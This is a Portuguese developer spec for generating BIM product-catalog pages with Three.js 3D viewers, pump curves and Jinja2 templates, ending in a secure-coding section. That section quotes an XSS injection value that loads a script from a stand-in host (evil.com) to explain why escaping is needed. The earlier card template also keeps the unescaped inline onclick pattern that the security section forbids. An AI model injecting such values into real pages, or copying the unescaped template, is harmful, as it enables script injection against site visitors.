---
name: pagina-biblioteca
description: Gera e renderiza páginas HTML de catálogo BIM com cards de produto, miniaturas 3D hover-to-activate, viewer 3D no modal, curvas Q-H em SVG e layout responsivo. Padrões validados em produção com Three.js self-hosted. Suporta JSONs com cores IFC (vertexColors) e sem.
version: 2.0.0
author: Bilds / carlosnetoaltoqi
---

# Spec: pagina-biblioteca

Cobre dois assuntos: **geração** (pipeline build.py → HTML via Jinja2) e **renderização** (Three.js, padrões de viewer, performance). Leia antes de editar qualquer template ou o build.py.

---

## Pipeline de geração — build.py

### config.json → catalog.json → HTML

```
config.json
  ├── slug          → nome da rota (/bombas-incendio)
  ├── titulo        → título do catálogo
  ├── fabricante    → nome do fabricante
  ├── descricao     → subtítulo hero
  ├── layout        → "series-rows" | "catalog-grid"
  ├── ifc_dir       → diretório com os .IFC
  ├── file_map      → { "arquivo.IFC": "slug-geo" }
  ├── aq_file       → caminho do .aq (SQLite dentro do ZIP)
  └── products_override → [] ou lista manual de produtos
```

O `build.py`:
1. Lê `config.json`
2. Chama `parse_ifc.py` → gera JSONs de geometria em `output/{slug}/data/`
3. Chama `read_aq.py` → lê curvas Q-H e specs do `.aq`
4. Monta `catalog.json` com todos os produtos, curvas e metadados
5. Renderiza `templates/layouts/{layout}.html` via **Jinja2** com `catalog` como contexto
6. Empacota `bilds-upload.zip` com HTML + JSONs + vendor

### Dados injetados no template

```html
<!-- Script sync recebe o catalog completo via tojson + safe -->
<script>
const CATALOG = {{ catalog | tojson | safe }};
const ITEMS   = CATALOG.produtos;
</script>
```

O `catalog` tem:
```json
{
  "slug": "bombas-incendio",
  "titulo": "Bombas de Combate a Incêndio",
  "fabricante": "Dancor",
  "descricao": "...",
  "filtros": ["CAM-W", "TJM"],
  "produtos": [
    {
      "id": "cam-w10",
      "nome": "CAM-W10",
      "serie": "CAM-W",
      "geo": "cam-w10.json",
      "potencia": "3,0",
      "conexoes": "...",
      "specs": { "Potência": "3,0 CV", "Rotação": "3500 rpm" },
      "curva": [[0, 12.5, 3.0, 55], [5, 11.2, 3.1, 60], ...]
    }
  ]
}
```

Cada ponto de `curva`: `[vazão m³/h, altura mca, potência CV, rendimento %]`.

---

## Dois layouts disponíveis — sempre gerados os dois

**Regra: todo build gera os dois layouts para o preview.** O `config.json` define o layout primário (vira `index.html`); o outro fica como alternativa navegável. O ZIP para bilds.com não inclui HTMLs e não é afetado.

Estrutura de saída obrigatória em `output/preview/{slug}/`:
```
index.html          ← layout primário (do config.json → "layout")
series-rows.html    ← sempre gerado, mesmo que não seja o primário
catalog-grid.html   ← sempre gerado, mesmo que não seja o primário
data/               ← geo JSONs — compartilhados pelos três HTMLs
```

### `series-rows` — linhas estilo Netflix

Para catálogos onde os produtos se agrupam em séries (ex: CAM-W, TJM). Renderiza uma `<section>` por série, cada uma com scroll horizontal snap.

- Hero grande: `min-height: 72vh`, `hero-sub`, botão CTA
- `<div id="rows-root">` — conteúdo injetado por `renderRows(filter)`
- Chips de filtro filtram quais séries aparecem

### `catalog-grid` — grid denso

Para catálogos homogêneos ou sem séries fortes. Todos os cards em `repeat(auto-fill, minmax(200px, 1fr))`.

- Hero compacto: `hero-ficha` com contagem de produtos/categorias/formato/software
- `<div id="grid-root">` + `<div id="empty-state">` — conteúdo injetado por `renderGrid(filter)`
- `toolbar-count` mostra contagem dinâmica

O layout primário é escolhido via `"layout"` no `config.json`. Não há auto-detecção.

---

## Arquitetura da página — dois scripts

A divisão sync/module resolve o problema de timing do Three.js:

```html
<!-- Script 1: sync — roda durante o parse, insere cards no DOM -->
<script>
const CATALOG = {{ catalog | tojson | safe }};
const ITEMS   = CATALOG.produtos;
const geoCache = new Map();   // ← declarado no sync, acessado pelo module via global

renderRows('all');  // ou renderGrid('all') — insere cards e dispara CustomEvent
</script>

<!-- Script 2: module — roda após DOMContentLoaded, acessa os canvases -->
<script type="module">
import * as THREE from 'three';
import { OrbitControls } from '/vendor/OrbitControls.js';

document.addEventListener('cards-rendered', () => observeCards());
observeCards(); // ← OBRIGATÓRIO: cards já estão no DOM quando o módulo carrega
                //   sem essa linha, os cards iniciais não são lazy-observados
</script>
```

Ao terminar de renderizar, o script sync dispara:
```javascript
document.dispatchEvent(new CustomEvent('cards-rendered', { detail: { filter } }));
```

**Por que o `observeCards()` direto é obrigatório:** o evento `cards-rendered` é disparado durante o parse do script sync, antes do módulo ser executado. O módulo só começa depois de `DOMContentLoaded`. Sem o `observeCards()` direto, o listener nunca captura o evento da renderização inicial e nenhum card é observado.

---

## Three.js self-hosted — obrigatório em produção Vercel

A Vercel aplica CSP `script-src 'self' 'unsafe-inline'` que bloqueia qualquer CDN externo. CDNs como `cdn.jsdelivr.net`, `unpkg.com` e `cdnjs.cloudflare.com` são bloqueados silenciosamente — o script não carrega, sem erro visível.

```
output/{slug}/
├── index.html
├── data/          ← JSONs de geometria
└── vendor/
    ├── three.module.js    ← baixar do GitHub releases
    └── OrbitControls.js   ← de three/examples/jsm/controls/
```

**Importmap no `<head>` — antes de qualquer `<script type="module">`:**
```html
<script type="importmap">
  {"imports":{"three":"/vendor/three.module.js"}}
</script>
```

**No módulo:**
```javascript
import * as THREE from 'three';                            // resolve via importmap
import { OrbitControls } from '/vendor/OrbitControls.js'; // path absoluto direto
```

**Fontes** (Google Fonts via `<link>`) não são bloqueadas pela CSP de scripts — usar normalmente:
```html
<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@700;800;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
```

---

## Padrão de miniatura estática + hover-to-3D

Não inicialize todos os viewers simultaneamente — GPU explode com 10+ contextos WebGL ativos.

### IntersectionObserver para lazy load

```javascript
const io = new IntersectionObserver(entries => {
  entries.forEach(e => {
    if (e.isIntersecting) { loadThumbnail(e.target.dataset.id); io.unobserve(e.target); }
  });
}, { rootMargin: '120px' });

document.querySelectorAll('.card[data-id]').forEach(card => io.observe(card));
```

### Render estático (um frame, sem loop)

```javascript
async function loadThumbnail(id) {
  if (thumbStates.has(id)) return; // já inicializado
  thumbStates.set(id, null);       // reserva — previne dupla inicialização concorrente

  const item = ITEMS.find(i => i.id === id);
  const canvas = document.getElementById('canvas-' + id);
  const W = canvas.parentElement.offsetWidth || 224;
  const H = canvas.parentElement.offsetHeight || 162;

  const data = await fetchGeo(item.geo);

  const renderer = new THREE.WebGLRenderer({ canvas, antialias: false, alpha: false });
  renderer.setPixelRatio(Math.min(devicePixelRatio, 1.5)); // cap 1.5x nos cards
  renderer.setSize(W, H, false);
  renderer.setClearColor(0xF3F4F6, 1);

  const { scene, size } = buildScene(data);
  const camera = new THREE.PerspectiveCamera(38, W / H, 0.001, 500);
  camera.position.set(size * 0.85, size * 0.32, size * 0.85);
  camera.lookAt(0, 0, 0);

  renderer.render(scene, camera); // UM frame — para aqui

  thumbStates.set(id, { renderer, scene, camera, raf: null, controls: null, rotating: false });
  // wiring do hover segue abaixo
}
```

### Ativar ao passar o mouse (hover-to-3D)

```javascript
canvas.addEventListener('mouseenter', () => {
  const st = thumbStates.get(id);
  if (!st) return;
  if (!st.controls) {
    badge.classList.add('off'); // some o badge ao ativar pela primeira vez
    const controls = new OrbitControls(camera, canvas);
    controls.autoRotate = true; controls.autoRotateSpeed = 1.2;
    controls.enableDamping = true; controls.dampingFactor = 0.07;
    controls.enableZoom = false; controls.enablePan = false;
    st.controls = controls;
    st.spin = function() {
      if (!st.rotating) { st.raf = null; return; } // loop para quando rotating=false
      st.raf = requestAnimationFrame(st.spin);
      controls.update();
      renderer.render(scene, camera);
    };
  }
  st.rotating = true;
  if (!st.raf) st.spin(); // reinicia o loop se estava parado
});

canvas.addEventListener('mouseleave', () => {
  const st = thumbStates.get(id);
  if (!st) return;
  st.rotating = false;          // loop para no próximo frame
  renderer.render(scene, camera); // congela no frame atual
});
```

**GPU protection:** o loop de animação (`st.spin`) roda apenas enquanto `st.rotating === true`. No `mouseleave`, a flag vai para `false` e o loop se encerra sozinho no próximo frame. Nenhum `cancelAnimationFrame` necessário — a flag é o guard.

### Estado por item — evitar reinicialização

```javascript
const thumbStates = new Map();
// thumbStates.get(id) = {
//   canvas,             ← elemento <canvas> ao qual esta entrada está presa — OBRIGATÓRIO
//   renderer, scene, camera,
//   raf: null,          ← ID do requestAnimationFrame atual
//   controls: null,     ← inicializado na primeira hover
//   rotating: false,    ← flag de controle do loop
//   spin: function      ← função do loop, criada na primeira hover
// }
```

Quando filtros re-renderizam os cards, limpar viewers órfãos em `observeCards()` —
comparando **identidade do elemento**, não só se o id ainda existe (ver armadilha
abaixo):
```javascript
function observeCards() {
  thumbStates.forEach((st, id) => {
    const current = document.getElementById('canvas-' + id);
    if (!current || !st || current !== st.canvas) {
      if (st) {
        cancelAnimationFrame(st.raf);
        st.controls?.dispose();
        st.renderer?.dispose();
      }
      thumbStates.delete(id);
    }
  });
  document.querySelectorAll('.card[data-id]').forEach(card => io.observe(card));
}
```

---

## Armadilha: card trava em "Carregando…" pra sempre ao trocar de filtro

**Sintoma:** ao trocar de filtro rapidamente (ou reabrir um filtro que já tinha
sido visto antes), alguns cards ficam presos no texto "Carregando…" para
sempre — o 3D nunca aparece, mesmo esperando indefinidamente.

**Causa raiz — corrida entre `fetch` em voo e re-render do filtro:**

`loadThumbnail(id)` reserva `thumbStates.set(id, null)` **antes** do
`await fetchGeo(...)`, e captura `canvas`/`loader` como variáveis locais no
início da função. Se o filtro trocar enquanto esse fetch ainda está em voo,
`renderRows()/renderGrid()` substitui `innerHTML` inteiro — os elementos
antigos são destruídos e **novos elementos com o mesmo `id`** são criados.
Só que:

1. As variáveis `canvas`/`loader` capturadas antes do `await` continuam
   apontando para os nós **antigos, agora desconectados do DOM**.
2. `observeCards()` limpa órfãos checando só `!document.getElementById('canvas-'+id)`
   — como o id ainda existe (no elemento novo), a limpeza não dispara.
3. Quando o fetch antigo resolve, ele escreve no elemento antigo desconectado
   (`loader.style.display='none'` não tem efeito visual nenhum) e marca
   `thumbStates.set(id, {...})` como "carregado".
4. O `IntersectionObserver` do card **novo** (visível) chama `loadThumbnail(id)`
   de novo — mas como `thumbStates.has(id)` já é `true` (do passo 3), a função
   retorna **imediatamente**, sem nunca tocar no loader novo. Ele fica preso
   em "Carregando…" para sempre.

**Correção:** amarrar cada entrada de `thumbStates` ao elemento `canvas` real
(campo `canvas` no objeto, desde a reserva inicial), e invalidar sempre que o
elemento atual do DOM não bater com o que está guardado — tanto dentro de
`loadThumbnail()` (depois do `await`) quanto em `observeCards()`:

```javascript
async function loadThumbnail(id) {
  if (thumbStates.has(id)) return;
  const canvas = document.getElementById('canvas-' + id);
  const loader = document.getElementById('loader-' + id);
  if (!canvas) return;
  thumbStates.set(id, { canvas, pending: true }); // reserva presa a ESTE canvas

  try {
    const data = await fetchGeo(item.geo);

    // Filtro pode ter re-renderizado os cards enquanto carregava — se a
    // reserva não é mais a nossa, um card novo já assumiu este id. Abortar
    // sem tocar em nós desconectados do DOM.
    if (thumbStates.get(id)?.canvas !== canvas) return;

    // ...cria renderer, renderiza, esconde loader...
    thumbStates.set(id, { canvas, renderer, scene, camera, raf: null, controls: null, rotating: false });
  } catch (e) {
    if (thumbStates.get(id)?.canvas === canvas) thumbStates.delete(id);
    if (loader) loader.textContent = 'Erro ao carregar';
  }
}
```

`observeCards()` também precisa comparar identidade do elemento, não só
existência do id (ver seção "Estado por item" acima) — sem isso, a limpeza de
órfãos não detecta "mesmo id, elemento novo" e o bug persiste mesmo com o
`canvas` guardado.

**Por que "às vezes"**: só acontece quando o produto continua visível depois
da troca de filtro (ex: alternar entre "Todos" e uma série que inclui o
mesmo item) E o fetch ainda não tinha terminado no momento da troca —
depende de timing de rede, por isso é intermitente e não reproduz toda vez.

**Como testar sem navegador real** (útil se o sandbox não tiver libs pra
Chromium headless): extrair os `<script>` reais do HTML gerado, stubar
`THREE`/`OrbitControls`/`IntersectionObserver`/`fetch` e rodar em `jsdom`,
disparando a intersecção do card, trocando de filtro no meio do fetch (antes
dele resolver) e checando se o loader do card novo fica preso. Rodar a mesma
verificação contra a versão antiga do template confirma que o teste pega o
bug de verdade (não é falso-positivo).

---

## Cache de geometria

`geoCache` é declarado no script **sync** (escopo global da página) e compartilhado com o script module:

```javascript
// Script sync:
const geoCache = new Map();

// Script module (fetchGeo):
async function fetchGeo(geoFile) {
  if (geoCache.has(geoFile)) return geoCache.get(geoFile);
  const data = await fetch('/data/' + geoFile).then(r => r.json());
  geoCache.set(geoFile, data);
  return data;
}
```

**Path sempre absoluto `/data/`** — as páginas são servidas em `/{slug}/`, então `./data/` resolveria para `/{slug}/data/` (404). O arquivo físico fica em `output/{slug}/data/` mas é servido em `/data/` pela raiz do deploy.

---

## Construção de cena Three.js a partir do JSON

O JSON pode vir em dois formatos (ver `leitor-ifc.md`): expandido `{pos, col}` ou indexado `{pos, col, idx}`:

```javascript
function buildScene(data) {
  const scene = new THREE.Scene();
  const geom = new THREE.BufferGeometry();

  geom.setAttribute('position', new THREE.Float32BufferAttribute(data.pos, 3));

  const hasCol = data.col && data.col.length > 0;
  if (hasCol) geom.setAttribute('color', new THREE.Float32BufferAttribute(data.col, 3));
  if (data.idx) geom.setIndex(data.idx); // ausente = geometria expandida

  geom.computeVertexNormals();
  geom.computeBoundingBox();

  const center = geom.boundingBox.getCenter(new THREE.Vector3());
  const size   = geom.boundingBox.getSize(new THREE.Vector3()).length();

  const mat = new THREE.MeshStandardMaterial({
    vertexColors: hasCol,
    color: hasCol ? 0xffffff : 0x8896AA, // branca com vertexColors, cinza aço sem
    metalness: 0.25,
    roughness: 0.55,
  });
  const mesh = new THREE.Mesh(geom, mat);
  mesh.position.copy(center.negate());
  scene.add(mesh);

  // Iluminação 3-pontos para peças industriais
  scene.add(new THREE.AmbientLight(0xffffff, 0.7));
  const key = new THREE.DirectionalLight(0xffffff, 0.9);
  key.position.set(2, 3, 2); scene.add(key);
  const fill = new THREE.DirectionalLight(0xC8D8F0, 0.35);
  fill.position.set(-2, 1, -1); scene.add(fill);

  return { scene, size };
}
```

`size` (diagonal da bounding box) é usado para posicionar a câmera proporcionalmente — funciona para qualquer escala de equipamento.

> **Por que `color: 0xffffff` com `vertexColors`?** O Three.js multiplica a cor base pelo atributo de vértice. Com base branca (1,1,1) o resultado é a cor IFC pura. Com base cinza, as cores ficam dessaturadas.

---

## Viewer 3D no modal

O modal usa canvas separado com qualidade maior. Sempre ativo (loop permanente enquanto aberto), descartado ao fechar.

```javascript
let modalViewer = null;

async function initModalViewer(id) {
  if (modalViewer) {
    cancelAnimationFrame(modalViewer.raf);
    modalViewer.controls?.dispose();
    modalViewer.renderer.dispose();
    modalViewer = null;
  }

  const item = ITEMS.find(i => i.id === id);
  const canvas = document.getElementById('modal-canvas');
  const W = canvas.parentElement.offsetWidth || 760;
  const H = canvas.parentElement.offsetHeight || 300;

  const data = await fetchGeo(item.geo); // usa o geoCache — sem segundo fetch

  const renderer = new THREE.WebGLRenderer({ canvas, antialias: true, alpha: false });
  renderer.setPixelRatio(Math.min(devicePixelRatio, 2)); // 2x no modal
  renderer.setSize(W, H, false);
  renderer.setClearColor(0xF3F4F6, 1);

  const { scene, size } = buildScene(data);
  const camera = new THREE.PerspectiveCamera(34, W / H, 0.001, 500);
  camera.position.set(size * 0.9, size * 0.35, size * 0.9);
  camera.lookAt(0, 0, 0);

  const controls = new OrbitControls(camera, canvas);
  controls.autoRotate = true; controls.autoRotateSpeed = 0.7;
  controls.enableDamping = true; controls.dampingFactor = 0.06;
  controls.enableZoom = true;  // modal pode ter zoom, card não
  controls.enablePan = false;

  const mv = { renderer, scene, camera, controls, raf: null };
  modalViewer = mv;
  function animate() {
    if (modalViewer !== mv) return; // guard: outro modal abriu
    mv.raf = requestAnimationFrame(animate);
    controls.update();
    renderer.render(scene, camera);
  }
  animate();
}

// Eventos do modal:
document.addEventListener('modal-open',  e  => initModalViewer(e.detail.id));
document.addEventListener('modal-close', () => {
  if (modalViewer) {
    cancelAnimationFrame(modalViewer.raf);
    modalViewer.controls?.dispose();
    modalViewer.renderer.dispose();
    modalViewer = null;
  }
});
```

---

## Padrão: seção técnica específica de tipo de produto (não mostrar placeholder vazio)

**Princípio geral, não específico de curva Q-H:** algumas seções do modal são
conceitos técnicos que só existem para certos tipos de produto (curva Q-H é
de bomba; poderia ser "vazão nominal" pra registro, "classe de pressão" pra
tubo, etc). Quando o catálogo inteiro não tem esse conceito — porque a linha
de produto não é desse tipo —, a seção **não deve aparecer nem como
placeholder vazio** ("Curva não disponível", "—"). Isso é diferente de um
produto individual que tem o conceito aplicável mas está com dado faltando
(aí sim mostrar o placeholder faz sentido, é uma lacuna real de dados).

**Como decidir automaticamente, sem configuração manual por catálogo:**
`build.py` calcula, ao montar o `catalog.json`, se **algum** produto do
catálogo tem aquele dado:
```python
tem_curva_qh = any(p.get('curva') for p in produtos)
```
- Se **nenhum** produto do catálogo tem `curva` → o conceito não se aplica a
  esse tipo de peça → esconder a seção inteira (título + gráfico) em todos os
  produtos, catálogo inteiro.
- Se **algum** produto tem `curva` → o conceito se aplica a essa linha →
  manter a seção visível; produtos individuais sem dado mostram o
  placeholder normalmente (gap de dado real, não ausência de conceito).

No template, um flag booleano no `catalog` (injetado via `{{ catalog | tojson | safe }}`,
então disponível como `CATALOG.tem_curva_qh` no JS) controla isso **uma vez**,
fora do `openModal()` (é constante pro catálogo inteiro, não precisa recalcular
a cada abertura de modal):
```javascript
if (!CATALOG.tem_curva_qh) {
  document.getElementById('modal-chart-wrap').style.display = 'none';
  document.querySelector('.modal-body').classList.add('no-curve'); // grid 1 coluna
}
```
```css
.modal-body{display:grid;grid-template-columns:1fr 1fr;gap:20px}
.modal-body.no-curve{grid-template-columns:1fr}  /* especificações ocupa tudo */
```

**Ao adicionar um novo tipo de dado técnico condicional** (não só curva Q-H),
seguir o mesmo padrão: computar `tem_X` em `build_catalog()` a partir de
`any(...)` sobre os produtos, expor no `catalog.json`, e esconder a seção
inteira via JS quando `false` — nunca deixar um placeholder de "não
disponível" aparecer pra um tipo de produto onde o dado não é um conceito
aplicável.

---

## Curva Q-H em SVG inline

Gerada a partir de pontos `[vazão, altura, potência, rendimento]`:

```javascript
function buildChart(pts, W=300, H=180) {
  if (!pts?.length) return '<p>Curva não disponível.</p>';
  const pl=40, pr=12, pt=14, pb=36;
  const cW=W-pl-pr, cH=H-pt-pb;
  const qMax = Math.max(...pts.map(p=>p[0])) * 1.1;
  const hMax = Math.max(...pts.map(p=>p[1])) * 1.18;
  const tx = q => pl + (q/qMax)*cW;
  const ty = h => H - pb - (h/hMax)*cH;

  let g = '';
  [.25,.5,.75,1].forEach(f => {
    const yy = ty(hMax*f).toFixed(1);
    g += `<line x1="${pl}" y1="${yy}" x2="${W-pr}" y2="${yy}" stroke="#E5E7EB" stroke-width="1"/>`;
    g += `<text x="${pl-5}" y="${+yy+3}" text-anchor="end" fill="#6B7280" font-size="9">${Math.round(hMax*f)}</text>`;
  });

  const path = 'M' + pts.map(p=>`${tx(p[0]).toFixed(1)},${ty(p[1]).toFixed(1)}`).join('L');
  const area = path + `L${tx(pts.at(-1)[0]).toFixed(1)},${H-pb}L${tx(pts[0][0]).toFixed(1)},${H-pb}Z`;

  const tyEff = e => H - pb - (Math.min(e,65)/65)*cH;
  const eff = pts[0][3] != null
    ? 'M' + pts.map(p=>`${tx(p[0]).toFixed(1)},${tyEff(p[3]).toFixed(1)}`).join('L')
    : '';

  return `<svg viewBox="0 0 ${W} ${H}" style="width:100%" xmlns="http://www.w3.org/2000/svg">
    <rect x="${pl}" y="${pt}" width="${cW}" height="${cH}" fill="#FAFBFB" rx="2"/>
    ${g}
    <path d="${area}" fill="rgba(30,64,175,0.1)"/>
    <path d="${path}" fill="none" stroke="#1E40AF" stroke-width="2" stroke-linejoin="round"/>
    ${eff ? `<path d="${eff}" fill="none" stroke="#9CA3AF" stroke-width="1.5" stroke-dasharray="4,3"/>` : ''}
    <text x="${pl+cW/2}" y="${H-2}" text-anchor="middle" fill="#9CA3AF" font-size="9">Vazão (m³/h)</text>
    <text x="8" y="${pt+cH/2}" text-anchor="middle" fill="#9CA3AF" font-size="9"
          transform="rotate(-90,8,${pt+cH/2})">m.c.a</text>
  </svg>`;
}
```

---

## Estrutura do card e classes CSS canônicas

```javascript
function buildCard(item) {
  return `<div class="card" data-id="${item.id}" onclick="openModal('${item.id}')">
    <div class="card-canvas-wrap">
      <canvas id="canvas-${item.id}"></canvas>
      <div class="card-loader" id="loader-${item.id}">Carregando…</div>
      <div class="badge-3d" id="badge-${item.id}">
        <svg viewBox="0 0 24 24"><!-- ícone 3D box Lucide --></svg>
      </div>
    </div>
    <div class="card-body">
      <div class="card-name">${item.nome}</div>
      <div class="card-meta">…</div>
      <button class="card-btn">Ver detalhes</button>
    </div>
  </div>`;
}
```

Classes canônicas (não divergir):
| Classe | Descrição |
|---|---|
| `.card[data-id]` | Elemento observado pelo IntersectionObserver |
| `.card-canvas-wrap` | Container do canvas — `position:relative`, altura fixa |
| `.card-loader` | Overlay de loading — `display:none` após geo carregada |
| `.badge-3d` | Badge do ícone 3D — `.off` = `opacity:0; pointer-events:none` |
| `.card-body` | Corpo de texto do card |

---

## Design tokens e tipografia

```css
:root {
  --orange: #FF4F1F;   /* CTA apenas — botão primário, badge 3D */
  --blue:   #1E40AF;   /* links, filtros ativos, curva Q-H */
  --navy:   #002D72;
  --navy-dark: #00245B; /* hero background */
  --bg:     #F8F9FA;
  --surface: #fff;
  --text:   #111827;
  --muted:  #6B7280;
  --border: #E5E7EB;
  --radius: 4px;       /* border-radius de todos os elementos */
}
```

**Fontes:**
- Fira Sans (700/800/900) — títulos de seção, h1 do hero
- Inter (400/500/600) — todo o resto

**Ícones:** Lucide SVG inline, `stroke-width:2`, `fill:none`, `stroke:currentColor`. Nunca font-icon ou CDN de ícones.

---

## Layout rows (series-rows)

```css
.row-track {
  display: flex; gap: 12px; overflow-x: auto;
  padding: 4px 0 16px; scroll-snap-type: x mandatory;
  scrollbar-width: none;
}
.row-track::-webkit-scrollbar { display: none; }
.card { scroll-snap-align: start; flex-shrink: 0; width: 224px; }
.row-outer::before, .row-outer::after {
  /* fade nas bordas — sinaliza overflow */
  content: ''; position: absolute; top: 0; bottom: 16px; width: 28px;
  z-index: 10; pointer-events: none;
}
```

---

## Modal

```css
.modal-backdrop { position: fixed; inset: 0; z-index: 200; display: none; }
.modal-backdrop.open { display: flex; }
.modal { max-width: 820px; max-height: 92vh; overflow-y: auto; }
.modal-head    { position: sticky; top: 0;    z-index: 10; } /* título */
.modal-3d      { height: 300px; }                            /* canvas viewer */
.modal-body    { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
.modal-actions { position: sticky; bottom: 0; z-index: 10; } /* CTAs */
```

Estrutura interna: head sticky → canvas 3D → grid (specs | gráfico) → actions sticky.

---

## Responsividade

```css
@media (max-width: 600px) {
  .card { width: 196px; }
  .card-canvas-wrap { height: 142px; }
  .modal-body { grid-template-columns: 1fr; }
  .modal-3d { height: 220px; }
}
@media (max-width: 640px) {
  .hero::after { background: none; } /* remove gradiente no hero grande */
}
@media (max-width: 700px) {
  /* catalog-grid: hero-ficha empilha abaixo do texto */
  .hero-inner { flex-direction: column; }
}
```

---

## Armadilhas encontradas em produção

| Problema | Causa | Solução |
|---|---|---|
| Three.js não carrega (sem erro) | CDN bloqueado por CSP Vercel | Self-host em `/vendor/`, usar importmap |
| `import * as THREE from 'three'` falha | Importmap ausente ou fora de ordem | `<script type="importmap">` antes de qualquer module script |
| Cards iniciais não carregam geo | `observeCards()` direto ausente no init do módulo | Chamar `observeCards()` diretamente, além do listener de `cards-rendered` |
| GPU trava com 10+ viewers | Múltiplos loops simultâneos | Thumbnail estática + loop controlado por `st.rotating` |
| Hover não inicia rotação | `st.raf` já existe mas `rotating` era false | `if (!st.raf) st.spin()` após setar `rotating = true` |
| Viewer do modal usa geometria errada | Modal anterior não foi descartado | Guard `if (modalViewer !== mv) return` no loop |
| Filtro recria cards, viewers reiniciam | `thumbStates` não limpo | Chamar limpeza de órfãos em `observeCards()` antes de re-observar |
| Card trava em "Carregando…" pra sempre ao trocar de filtro (intermitente) | Corrida: fetch em voo termina depois do filtro re-renderizar o mesmo id com um canvas NOVO; `thumbStates.has(id)` já true, bloqueia o card novo | Amarrar `thumbStates[id]` ao elemento `canvas` real (campo `canvas`); checar `thumbStates.get(id)?.canvas !== canvas` depois do `await` e em `observeCards()` — ver seção "Armadilha: card trava em Carregando" acima |
| Canvas com tamanho errado no mobile | `offsetWidth` retorna 0 antes do layout | Fallback: `const W = wrap.offsetWidth \|\| 224` |
| 404 nos JSONs de geometria | Path relativo `./data/` em vez de `/data/` | Sempre usar path absoluto `/data/` — página serve em `/{slug}/` |
| Cores IFC presentes mas modelo cinza | `vertexColors: false` ou `color` não branca | `vertexColors: hasCol` e `color: 0xffffff` quando há `col[]` |
| `geom.setIndex(data.idx)` explode | `data.idx` é `undefined` em geo expandida | Guard: `if (data.idx) geom.setIndex(data.idx)` |

---

## Segurança — padrões obrigatórios

### Jinja2: autoescape=True

O `Environment` do Jinja2 em `build.py` **deve** usar `autoescape=True`. Com `autoescape=False`, variáveis como `catalog.titulo`, `catalog.fabricante` e `catalog.filtros` são emitidas sem escaping — um `.aq` de terceiro com `NOME_PECA = </title><script src="evil.com/x.js"></script>` resulta em XSS no HTML servido pela Vercel.

```python
env = Environment(
    loader=FileSystemLoader(...),
    undefined=StrictUndefined,
    autoescape=True,   # OBRIGATÓRIO — dados do .aq são entrada não-confiável
)
```

Os templates usam `{{ catalog | tojson | safe }}` para o bloco `<script>` — isso é seguro porque o filtro `tojson` do Jinja2 escapa `<`/`>` como `<`/`>`.

### Fallback sem Jinja2: escapar `<` e `>` no JSON

No fallback sem Jinja2, `json.dumps` padrão **não** escapa `</script>`. Usar:

```python
def _json_for_html(obj):
    return (json.dumps(obj, ensure_ascii=False)
            .replace('<', '\\u003c')
            .replace('>', '\\u003e'))
```

### Templates: `esc()` obrigatório no innerHTML

Dados de texto livre (`item.nome`, `item.serie`, `item.conexoes`, chaves e valores de `item.specs`) são inseridos via `innerHTML` nos cards e no modal. Sempre usar `esc()` nesses pontos — o JSON dentro do `<script>` estar seguro não protege o `innerHTML`:

```javascript
function esc(s) {
  return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
// Uso:
`<div class="card-name">${esc(item.nome)}</div>`
`<tr><th>${esc(k)}</th><td>${esc(v)}</td></tr>`
```

### Event delegation — sem onclick inline com dados de usuário

Não usar `onclick="openModal('${item.id}')"` nem `onclick="filterBy('${f}',this)"` — interpolação direta em atributos `onclick` é vetor de JS injection. Usar event delegation no container:

```javascript
document.getElementById('grid-root').addEventListener('click', function(e) {
  var card = e.target.closest('.card');
  if (card) openModal(card.dataset.id);   // id vem do DOM, não de string interpolada
});
document.getElementById('toolbar').addEventListener('click', function(e) {
  var btn = e.target.closest('.chip');
  if (btn) filterBy(btn.dataset.filter, btn);
});
```

### Slug validado em build.py

O `slug` do catálogo e o `geo` de cada produto são usados em paths de diretório e arcnames do ZIP. `build.py` valida ambos com `_assert_safe_slug()` antes de qualquer operação de I/O — lança `ValueError` imediatamente se o valor contiver `..`, `/`, ou caracteres especiais:

```python
_SAFE_SLUG_RE = re.compile(r'^[a-z0-9][a-z0-9\-_]*$')
def _assert_safe_slug(value, field):
    if not _SAFE_SLUG_RE.match(str(value)):
        raise ValueError(f'Valor inválido para {field}: {value!r}')
```
| `cleanUrls` funciona na Vercel mas não local | Comportamento de servidor | Localmente usar extensão `.html`; na Vercel a rota sem extensão funciona |
